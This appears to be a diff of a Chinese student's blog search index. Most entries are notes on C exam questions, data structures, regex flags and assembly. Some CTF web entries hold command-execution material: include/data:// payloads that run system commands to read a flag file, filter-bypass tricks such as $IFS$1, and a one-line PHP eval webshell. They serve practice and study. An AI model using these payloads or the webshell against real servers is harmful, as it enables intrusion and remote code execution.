-    <content><![CDATA[<h1 id="二级好题集-持续更新"><a href="#二级好题集-持续更新" class="headerlink" title="二级好题集(持续更新)"></a>二级好题集(持续更新)</h1><h2 id="25-3-2"><a href="#25-3-2" class="headerlink" title="25.3.2"></a>25.3.2</h2><h3 id="关于最大元素的读取"><a href="#关于最大元素的读取" class="headerlink" title="关于最大元素的读取"></a>关于最大元素的读取</h3><img src="/2025/03/02/%E4%BA%8C%E7%BA%A7%E5%A5%BD%E9%A2%98%E7%A7%AF%E7%B4%AF-%E9%80%89%E6%8B%A9%E9%A2%98/image-20250302185105408.png" class="" title="image-20250302185105408">
-
-<ul>
-<li><p><strong>请记住，不要直接硬生生地把这些数字带进去算，要读懂数字代表的什么</strong></p>
-</li>
-<li><p>比如这道题,**就需要你去把这个函数在干什么读懂:**这个函数是一个关于对数组最大值的选择的函数。</p>
-</li>
-<li><p>技巧:<strong>注意观察:</strong></p>
-</li>
-<li><ul>
-<li>变量增加的先后关系。比如:</li>
-<li>该函数<code>p</code>值首先增加，增加后,若是索引<code>k</code>的值没有比索引<code>p</code>的值更大，那么索引k讲变为索引p,注意这里的变化关系!</li>
-<li>即变量变化的先后顺序,先进行比较，后值发生改变。</li>
-<li>另外,*<em>为什么这里么可以让p直接赋值给初始化后的指针</em>P呢，不应该是把p的地址给<em>p吗,比如:<em>k &#x3D; &amp;p</em></em>                                                                  解答如下:</li>
-</ul>
-<ul>
-<li><p><code>&amp;k</code> 是取 <code>main</code> 函数中变量 <code>k</code> 的地址，传递给 <code>fun</code> 函数中的 <code>k</code> 。这就使得 <code>fun</code> 函数中的指针 <code>k</code> 指向了 <code>main</code> 函数中的变量 <code>k</code> ，也就是说，<code>fun</code> 函数中的 <code>*k</code> 和 <code>main</code> 函数中的 <code>k</code> 代表同一块内存空间，对 <code>*k</code> 的操作等同于对 <code>main</code> 函数中 <code>k</code> 的操作。</p>
-</li>
-<li><p>在 <code>fun</code> 函数的 <code>for</code> 循环初始化部分 <code>for( p=0, *k=p; p&lt;t; p++ )</code> 中：</p>
-<ul>
-<li><code>p</code> 是一个普通的整型变量，在循环初始化时被赋值为 <code>0</code> 。</li>
-<li><code>*k</code> 表示的是指针 <code>k</code> 所指向的内存单元中的值 。由于前面函数调用时 <code>fun</code> 函数的指针 <code>k</code> 指向了 <code>main</code> 函数中的变量 <code>k</code>，所以 <code>*k</code> 其实就是 <code>main</code> 函数中的 <code>k</code> 这个变量。</li>
-<li><code>*k = p</code> 这一步，就是把整型变量 <code>p</code> 的值赋给 <code>main</code> 函数中的 <code>k</code> 变量 。因为 <code>p</code> 和 <code>*k</code>（即 <code>main</code> 函数中的 <code>k</code> ）都是整型，所以可以直接进行赋值，而不是把 <code>p</code> 的地址赋值过去。</li>
-</ul>
-<p>如果写成 <code>*k = &amp;p</code> ，<code>&amp;p</code> 得到的是 <code>p</code> 这个变量在内存中的地址，属于 <code>int *</code> 类型，而 <code>*k</code> 是整型变量，两者类型不匹配，这样的赋值在 C 语言中是不允许的。</p>
-</li>
-</ul>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>c语言</category>
-      </categories>
-      <tags>
-        <tag>二级好题</tag>
       </tags>
   </entry>
   <entry>
@@ -2439,6 +2573,90 @@ print(year2)
       </tags>
   </entry>
   <entry>
+    <title>二级通识</title>
+    <url>/2025/03/19/%E4%BA%8C%E7%BA%A7%E9%80%9A%E8%AF%86/</url>
+    <content><![CDATA[<h1 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h1><h2 id="循环队列"><a href="#循环队列" class="headerlink" title="循环队列"></a>循环队列</h2><img src="/2025/03/19/%E4%BA%8C%E7%BA%A7%E9%80%9A%E8%AF%86/image-20250319131007896.png" class="" title="image-20250319131007896">
+
+<ul>
+<li><p>解析:</p>
+</li>
+<li><p>咱把循环队列想象成一个头尾相连的环形跑道，跑道上有一些位置能放东西。队头指针 <code>front</code> 就像是在跑道上标记从哪儿开始取东西，队尾指针 <code>rear</code> 标记着下一个能放东西的位置。</p>
+<p>一般来说，要是队头和队尾都在跑道的最后一个位置（也就是 <code>front = rear = m</code> ，这里 <code>m</code> 是跑道总共能放东西的位置数量 ），那就说明跑道上啥东西都没有，队列是空的。</p>
+<p>但要是队头和队尾在同一个位置，可又不是跑道最后那个位置（像这题里 <code>front = rear = 25</code> ，不是 50 ），这时候队列可能是空的，也可能是摆满东西了。</p>
+<p>这题说又成功放进去一个东西，要是队列已经摆满了，就没地方放新东西了，所以就说明之前队列是空的。那放进去一个东西后，队列里自然就只有这 1 个东西啦，答案就是 A 选项。</p>
+</li>
+</ul>
+<h1 id="栈和队列"><a href="#栈和队列" class="headerlink" title="栈和队列"></a>栈和队列</h1><h2 id="做题注意"><a href="#做题注意" class="headerlink" title="做题注意"></a>做题注意</h2><img src="/2025/03/19/%E4%BA%8C%E7%BA%A7%E9%80%9A%E8%AF%86/image-20250319180642957.png" class="" title="image-20250319180642957">
+
+<ul>
+<li>这题玩文字游戏：这里说的是<strong>轮流</strong>进入&#x2F;出栈，<strong>轮流</strong>进入&#x2F;退队，所以逻辑是<code>A,C,E,G</code>入栈，<code>B,D,F,H</code>入队，出栈和出队也是这个顺序。</li>
+</ul>
+<h2 id="关于栈的top指针"><a href="#关于栈的top指针" class="headerlink" title="关于栈的top指针"></a>关于栈的<code>top</code>指针</h2><ul>
+<li>例题：</li>
+<li><img src="/2025/03/19/%E4%BA%8C%E7%BA%A7%E9%80%9A%E8%AF%86/image-20250323141256949.png" class="" title="image-20250323141256949"></li>
+<li><strong>入栈</strong>:top指针递减1，**出栈：**top指针增加1：</li>
+<li>原因：指针<code>top</code>始终指向栈顶的位置，<code>top</code>赋值为<code>51</code>,意味着刚开始指针在范围之外，栈为空，一个元素入栈后，<code>top</code>值会减一，一直到<code>top</code>值为<code>1</code>。</li>
+</ul>
+<h1 id="程序化结构"><a href="#程序化结构" class="headerlink" title="程序化结构"></a>程序化结构</h1><h2 id="结构化程序的基本控制结构"><a href="#结构化程序的基本控制结构" class="headerlink" title="结构化程序的基本控制结构"></a>结构化程序的基本控制结构</h2><ul>
+<li>顺序，选择和重复。</li>
+</ul>
+<h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><h2 id="关系数据库"><a href="#关系数据库" class="headerlink" title="关系数据库"></a>关系数据库</h2><ul>
+<li>关系模式是用来记录用户数据的<code>二维表</code>。</li>
+<li><img src="/2025/03/19/%E4%BA%8C%E7%BA%A7%E9%80%9A%E8%AF%86/image-20250323143035302.png" class="" title="image-20250323143035302"></li>
+</ul>
+<h1 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h1><ul>
+<li>算法可以用各种方式来描述，<code>N-S</code>流程图把算法的每一步使用一个矩形框来表示，一个个矩形框按执行的次序来链接就是一个算法描述。</li>
+<li>使用三种基本算法:<strong>顺序、循环、选择结构</strong>就可以实现任何复杂的算法。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>计算机基础</category>
+      </categories>
+      <tags>
+        <tag>计算机基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>二级好题积累:选择题</title>
+    <url>/2025/03/02/%E4%BA%8C%E7%BA%A7%E5%A5%BD%E9%A2%98%E7%A7%AF%E7%B4%AF-%E9%80%89%E6%8B%A9%E9%A2%98/</url>
+    <content><![CDATA[<h1 id="二级好题集-持续更新"><a href="#二级好题集-持续更新" class="headerlink" title="二级好题集(持续更新)"></a>二级好题集(持续更新)</h1><h2 id="25-3-2"><a href="#25-3-2" class="headerlink" title="25.3.2"></a>25.3.2</h2><h3 id="关于最大元素的读取"><a href="#关于最大元素的读取" class="headerlink" title="关于最大元素的读取"></a>关于最大元素的读取</h3><img src="/2025/03/02/%E4%BA%8C%E7%BA%A7%E5%A5%BD%E9%A2%98%E7%A7%AF%E7%B4%AF-%E9%80%89%E6%8B%A9%E9%A2%98/image-20250302185105408.png" class="" title="image-20250302185105408">
+
+<ul>
+<li><p><strong>请记住，不要直接硬生生地把这些数字带进去算，要读懂数字代表的什么</strong></p>
+</li>
+<li><p>比如这道题,**就需要你去把这个函数在干什么读懂:**这个函数是一个关于对数组最大值的选择的函数。</p>
+</li>
+<li><p>技巧:<strong>注意观察:</strong></p>
+</li>
+<li><ul>
+<li>变量增加的先后关系。比如:</li>
+<li>该函数<code>p</code>值首先增加，增加后,若是索引<code>k</code>的值没有比索引<code>p</code>的值更大，那么索引k讲变为索引p,注意这里的变化关系!</li>
+<li>即变量变化的先后顺序,先进行比较，后值发生改变。</li>
+<li>另外,*<em>为什么这里么可以让p直接赋值给初始化后的指针</em>P呢，不应该是把p的地址给<em>p吗,比如:<em>k &#x3D; &amp;p</em></em>                                                                  解答如下:</li>
+</ul>
+<ul>
+<li><p><code>&amp;k</code> 是取 <code>main</code> 函数中变量 <code>k</code> 的地址，传递给 <code>fun</code> 函数中的 <code>k</code> 。这就使得 <code>fun</code> 函数中的指针 <code>k</code> 指向了 <code>main</code> 函数中的变量 <code>k</code> ，也就是说，<code>fun</code> 函数中的 <code>*k</code> 和 <code>main</code> 函数中的 <code>k</code> 代表同一块内存空间，对 <code>*k</code> 的操作等同于对 <code>main</code> 函数中 <code>k</code> 的操作。</p>
+</li>
+<li><p>在 <code>fun</code> 函数的 <code>for</code> 循环初始化部分 <code>for( p=0, *k=p; p&lt;t; p++ )</code> 中：</p>
+<ul>
+<li><code>p</code> 是一个普通的整型变量，在循环初始化时被赋值为 <code>0</code> 。</li>
+<li><code>*k</code> 表示的是指针 <code>k</code> 所指向的内存单元中的值 。由于前面函数调用时 <code>fun</code> 函数的指针 <code>k</code> 指向了 <code>main</code> 函数中的变量 <code>k</code>，所以 <code>*k</code> 其实就是 <code>main</code> 函数中的 <code>k</code> 这个变量。</li>
+<li><code>*k = p</code> 这一步，就是把整型变量 <code>p</code> 的值赋给 <code>main</code> 函数中的 <code>k</code> 变量 。因为 <code>p</code> 和 <code>*k</code>（即 <code>main</code> 函数中的 <code>k</code> ）都是整型，所以可以直接进行赋值，而不是把 <code>p</code> 的地址赋值过去。</li>
+</ul>
+<p>如果写成 <code>*k = &amp;p</code> ，<code>&amp;p</code> 得到的是 <code>p</code> 这个变量在内存中的地址，属于 <code>int *</code> 类型，而 <code>*k</code> 是整型变量，两者类型不匹配，这样的赋值在 C 语言中是不允许的。</p>
+</li>
+</ul>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>c语言</category>
+      </categories>
+      <tags>
+        <tag>二级好题</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>代码审计套路</title>
     <url>/2025/01/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A5%97%E8%B7%AF/</url>
     <content><![CDATA[<h3 id="代码审计的一些套路总结"><a href="#代码审计的一些套路总结" class="headerlink" title="代码审计的一些套路总结"></a>代码审计的一些套路总结</h3><h4 id="buuctf-HCTF-2018-WarmUp-strpos-substr截取代码"><a href="#buuctf-HCTF-2018-WarmUp-strpos-substr截取代码" class="headerlink" title="[buuctf] [HCTF 2018]WarmUp strpos&#x2F;substr截取代码"></a>[buuctf] [HCTF 2018]WarmUp strpos&#x2F;substr截取代码</h4><p>首先来看源码:</p>
@@ -2461,36 +2679,46 @@ print(year2)
       </tags>
   </entry>
   <entry>
-    <title>二级通识</title>
-    <url>/2025/03/19/%E4%BA%8C%E7%BA%A7%E9%80%9A%E8%AF%86/</url>
-    <content><![CDATA[<h1 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h1><h2 id="循环队列"><a href="#循环队列" class="headerlink" title="循环队列"></a>循环队列</h2><img src="/2025/03/19/%E4%BA%8C%E7%BA%A7%E9%80%9A%E8%AF%86/image-20250319131007896.png" class="" title="image-20250319131007896">
-
-<ul>
-<li><p>解析:</p>
-</li>
-<li><p>咱把循环队列想象成一个头尾相连的环形跑道，跑道上有一些位置能放东西。队头指针 <code>front</code> 就像是在跑道上标记从哪儿开始取东西，队尾指针 <code>rear</code> 标记着下一个能放东西的位置。</p>
-<p>一般来说，要是队头和队尾都在跑道的最后一个位置（也就是 <code>front = rear = m</code> ，这里 <code>m</code> 是跑道总共能放东西的位置数量 ），那就说明跑道上啥东西都没有，队列是空的。</p>
-<p>但要是队头和队尾在同一个位置，可又不是跑道最后那个位置（像这题里 <code>front = rear = 25</code> ，不是 50 ），这时候队列可能是空的，也可能是摆满东西了。</p>
-<p>这题说又成功放进去一个东西，要是队列已经摆满了，就没地方放新东西了，所以就说明之前队列是空的。那放进去一个东西后，队列里自然就只有这 1 个东西啦，答案就是 A 选项。</p>
-</li>
-</ul>
-<h1 id="栈和队列"><a href="#栈和队列" class="headerlink" title="栈和队列"></a>栈和队列</h1><h2 id="做题注意"><a href="#做题注意" class="headerlink" title="做题注意"></a>做题注意</h2><img src="/2025/03/19/%E4%BA%8C%E7%BA%A7%E9%80%9A%E8%AF%86/image-20250319180642957.png" class="" title="image-20250319180642957">
-
-<ul>
-<li>这题玩文字游戏：这里说的是<strong>轮流</strong>进入&#x2F;出栈，<strong>轮流</strong>进入&#x2F;退队，所以逻辑是<code>A,C,E,G</code>入栈，<code>B,D,F,H</code>入队，出栈和出队也是这个顺序。</li>
-</ul>
-<h1 id="程序化结构"><a href="#程序化结构" class="headerlink" title="程序化结构"></a>程序化结构</h1><h2 id="结构化程序的基本控制结构"><a href="#结构化程序的基本控制结构" class="headerlink" title="结构化程序的基本控制结构"></a>结构化程序的基本控制结构</h2><ul>
-<li>顺序，选择和重复。</li>
-</ul>
-<h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><h2 id="关系数据库"><a href="#关系数据库" class="headerlink" title="关系数据库"></a>关系数据库</h2><ul>
-<li>关系模式是用来记录用户数据的<code>二维表</code>。</li>
-</ul>
+    <title>命令执行:使用文件包含绕过</title>
+    <url>/2025/01/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%BB%95%E8%BF%87/</url>
+    <content><![CDATA[<h3 id="ctfshow-web32"><a href="#ctfshow-web32" class="headerlink" title="ctfshow web32"></a>ctfshow web32</h3><h4 id="读题和简单分析"><a href="#读题和简单分析" class="headerlink" title="读题和简单分析:"></a>读题和简单分析:</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:56:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里很简单明确:就是把shell flag php 这些关键词全部过滤了,主要是连后引号都过滤了,就不可以使用常规的命令执行了.</p>
+<h4 id="文件包含方法"><a href="#文件包含方法" class="headerlink" title="文件包含方法:"></a>文件包含方法:</h4><p>先说payloads:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(“ls”);?&gt;</span><br><span class="line">/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(“cat flag.php”);?&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="分割符"><a href="#分割符" class="headerlink" title="分割符"></a>分割符</h5><p><strong>&amp;:</strong><br>这里就把这个指令分成了两部分:<br>前面一部分赋值给超全局变量$_GET[‘c’],后面一部分就是另外一段包含代码的对象,并不会赋值给前面的c变量.这两段是完全分开的。<br><strong>?&gt;绕过(这是我的易错点):</strong><br>有个这样的机制:<br>php默认的机制,php中的?&gt;符号前面的字符会自带分号,就绕过了分号”;”,十分巧妙.</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h4><p>使用文件包含解决命令执行题目,通法就是先将include函数包含一个参数传递给要被正则表达式检查的变量,然后再在后半部分,再包含php伪协议给前面部分的include函数读取,达到绕过preg_match并且执行命令的目的.</p>
 ]]></content>
       <categories>
-        <category>计算机基础</category>
+        <category>ctfshow web</category>
       </categories>
       <tags>
-        <tag>计算机基础</tag>
+        <tag>命令执行</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>命令执行绕过符号总结</title>
+    <url>/2025/01/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E7%AC%A6%E5%8F%B7%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h3 id="命令执行绕过符号总结"><a href="#命令执行绕过符号总结" class="headerlink" title="命令执行绕过符号总结"></a>命令执行绕过符号总结</h3><p>在命令执行这种题目中我们总会遇到正则过滤,不得不使用一些特殊符号来绕过,下面是常见的符号和对应的绕过方法:</p>
+<h4 id="空格"><a href="#空格" class="headerlink" title="空格:"></a>空格:</h4><p>%20<br>%09<br><strong>Linux知识拓展:</strong></p>
+<ul>
+<li>$IFS(Internal Field Separator),在shell环境里面,这个东西叫做内部字段分隔f符,它可以被设置为很多默认的字符,比如空格,制表符,换行符等。</li>
+<li>虽然它默认为空格,但是我们不可以在shell中直接用$IFS代表空格,我们需要用这些方法来设置:</li>
+<li>$IFS$1,我来解释一下:<br>在 shell 脚本和命令行中，$1 通常表示传递给脚本或函数的第一个位置参数<br>但是在内部字段分割符这个地方,它被用来调取内部字段分隔符的第一个字符,即空格,参数位置为$1的空格。所以我们在这里可以用$IFS$1来绕过空格。</li>
+</ul>
+<h4 id="换行符"><a href="#换行符" class="headerlink" title="换行符:"></a>换行符:</h4><p>%0a</p>
+<h4 id="php分隔符号”“"><a href="#php分隔符号”“" class="headerlink" title="php分隔符号”“"></a>php分隔符号”<?"以及"?>“</h4><p>1.使用js代码来编辑php代码:</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;</span><br><span class="line">@<span class="built_in">eval</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>命令执行</tag>
       </tags>
   </entry>
   <entry>
@@ -2529,32 +2757,6 @@ class ContextAwareClassifier:
       </tags>
   </entry>
   <entry>
-    <title>命令执行绕过符号总结</title>
-    <url>/2025/01/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E7%AC%A6%E5%8F%B7%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<h3 id="命令执行绕过符号总结"><a href="#命令执行绕过符号总结" class="headerlink" title="命令执行绕过符号总结"></a>命令执行绕过符号总结</h3><p>在命令执行这种题目中我们总会遇到正则过滤,不得不使用一些特殊符号来绕过,下面是常见的符号和对应的绕过方法:</p>
-<h4 id="空格"><a href="#空格" class="headerlink" title="空格:"></a>空格:</h4><p>%20<br>%09<br><strong>Linux知识拓展:</strong></p>
-<ul>
-<li>$IFS(Internal Field Separator),在shell环境里面,这个东西叫做内部字段分隔f符,它可以被设置为很多默认的字符,比如空格,制表符,换行符等。</li>
-<li>虽然它默认为空格,但是我们不可以在shell中直接用$IFS代表空格,我们需要用这些方法来设置:</li>
-<li>$IFS$1,我来解释一下:<br>在 shell 脚本和命令行中，$1 通常表示传递给脚本或函数的第一个位置参数<br>但是在内部字段分割符这个地方,它被用来调取内部字段分隔符的第一个字符,即空格,参数位置为$1的空格。所以我们在这里可以用$IFS$1来绕过空格。</li>
-</ul>
-<h4 id="换行符"><a href="#换行符" class="headerlink" title="换行符:"></a>换行符:</h4><p>%0a</p>
-<h4 id="php分隔符号”“"><a href="#php分隔符号”“" class="headerlink" title="php分隔符号”“"></a>php分隔符号”<?"以及"?>“</h4><p>1.使用js代码来编辑php代码:</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;</span><br><span class="line">@<span class="built_in">eval</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-      <tags>
-        <tag>命令执行</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>挑战杯入门ai</title>
     <url>/2025/01/18/%E6%8C%91%E6%88%98%E6%9D%AF%E5%85%A5%E9%97%A8ai/</url>
     <content><![CDATA[<h3 id="初次认识ai模型"><a href="#初次认识ai模型" class="headerlink" title="初次认识ai模型"></a>初次认识ai模型</h3><h4 id="rag模型"><a href="#rag模型" class="headerlink" title="rag模型"></a>rag模型</h4><p>1.全称:<br>检索增强生成（Retrieval Augmented Generation），简称 RAG。</p>
@@ -2570,23 +2772,6 @@ class ContextAwareClassifier:
     <title>数据库基本概念</title>
     <url>/2025/01/23/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</url>
     <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>命令执行:使用文件包含绕过</title>
-    <url>/2025/01/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%BB%95%E8%BF%87/</url>
-    <content><![CDATA[<h3 id="ctfshow-web32"><a href="#ctfshow-web32" class="headerlink" title="ctfshow web32"></a>ctfshow web32</h3><h4 id="读题和简单分析"><a href="#读题和简单分析" class="headerlink" title="读题和简单分析:"></a>读题和简单分析:</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:56:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里很简单明确:就是把shell flag php 这些关键词全部过滤了,主要是连后引号都过滤了,就不可以使用常规的命令执行了.</p>
-<h4 id="文件包含方法"><a href="#文件包含方法" class="headerlink" title="文件包含方法:"></a>文件包含方法:</h4><p>先说payloads:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(“ls”);?&gt;</span><br><span class="line">/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(“cat flag.php”);?&gt;</span><br></pre></td></tr></table></figure>
-<h5 id="分割符"><a href="#分割符" class="headerlink" title="分割符"></a>分割符</h5><p><strong>&amp;:</strong><br>这里就把这个指令分成了两部分:<br>前面一部分赋值给超全局变量$_GET[‘c’],后面一部分就是另外一段包含代码的对象,并不会赋值给前面的c变量.这两段是完全分开的。<br><strong>?&gt;绕过(这是我的易错点):</strong><br>有个这样的机制:<br>php默认的机制,php中的?&gt;符号前面的字符会自带分号,就绕过了分号”;”,十分巧妙.</p>
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h4><p>使用文件包含解决命令执行题目,通法就是先将include函数包含一个参数传递给要被正则表达式检查的变量,然后再在后半部分,再包含php伪协议给前面部分的include函数读取,达到绕过preg_match并且执行命令的目的.</p>
-]]></content>
-      <categories>
-        <category>ctfshow web</category>
-      </categories>
-      <tags>
-        <tag>命令执行</tag>
-      </tags>
   </entry>
   <entry>
     <title>新加入的token的初始化相关说明</title>
@@ -2647,6 +2832,213 @@ class ContextAwareClassifier:
       </categories>
       <tags>
         <tag>大一寒假安排</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>正则匹配注意点个人笔记</title>
+    <url>/2025/01/14/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E6%B3%A8%E6%84%8F%E7%82%B9%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h3 id="正则匹配个人易忽略点记录"><a href="#正则匹配个人易忽略点记录" class="headerlink" title="正则匹配个人易忽略点记录"></a>正则匹配个人易忽略点记录</h3><h4 id="标志-模式修正符"><a href="#标志-模式修正符" class="headerlink" title="标志&#x2F;模式修正符"></a>标志&#x2F;模式修正符</h4><h5 id="1-多行修饰符-Multline"><a href="#1-多行修饰符-Multline" class="headerlink" title="1.多行修饰符(Multline)"></a>1.多行修饰符(Multline)</h5><p>与($,^)这两个检查首尾的符号紧密相关,注意点:在默认情况下,它们是默认检查全局，即所有字符的开头和结尾,即使你使用了换行符号,它也不会对首位进行检查。<br>例如表达式: &#x2F;.at(.)?$&#x2F;gm 表示小写字符a后跟小写字符t,末尾可选除换行符外任意字符</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;/.at(.)?$/&quot; =&gt; The fat</span><br><span class="line">                cat sat</span><br><span class="line">                on the mat.</span><br></pre></td></tr></table></figure>
+<p>这里只匹配mat<br>但是:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;/.at(.)?$/gm&quot; =&gt; The fat</span><br><span class="line">                  cat sat</span><br><span class="line">                  on the mat.</span><br></pre></td></tr></table></figure>
+<p>这里就会把fat,sat,mat都给匹配上</p>
+<p><strong>总结:</strong></p>
+<p>重点就是:m加上后会在每排匹配,没有m只会在全局看尾巴或者开头有没有目标字符。</p>
+]]></content>
+      <categories>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>正则匹配</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>汇编硬件基础</title>
+    <url>/2025/03/17/%E6%B1%87%E7%BC%96%E7%A1%AC%E4%BB%B6%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<h1 id="三线概念"><a href="#三线概念" class="headerlink" title="三线概念"></a>三线概念</h1><h2 id="名词辨析"><a href="#名词辨析" class="headerlink" title="名词辨析"></a>名词辨析</h2><ul>
+<li><strong>地址</strong>总线的宽度:</li>
+<li><ul>
+<li><strong>原理</strong>：地址总线宽度决定 CPU 的寻址能力，寻址能力的计算公式为 (2^n) （n 为地址总线宽度），单位是字节（Byte）。8bit &#x3D; 1Byte。</li>
+</ul>
+</li>
+<li>储存单元:</li>
+<li><ul>
+<li>**原理：**单位为Byte,存储单元从0开始，n-1结束</li>
+<li><img src="/2025/03/17/%E6%B1%87%E7%BC%96%E7%A1%AC%E4%BB%B6%E5%9F%BA%E7%A1%80/image-20250317185253083.png" class="" title="image-20250317185253083"></li>
+</ul>
+</li>
+<li><strong>数据</strong>总线宽度:</li>
+<li><ul>
+<li>原理:数据总线宽度决定了 CPU 一次能传送的数据位数，单位是位（bit），而 8 bit (&#x3D; 1) Byte ，直接根据数据总线宽度换算成字节（B）。</li>
+</ul>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>汇编语言</category>
+      </categories>
+      <tags>
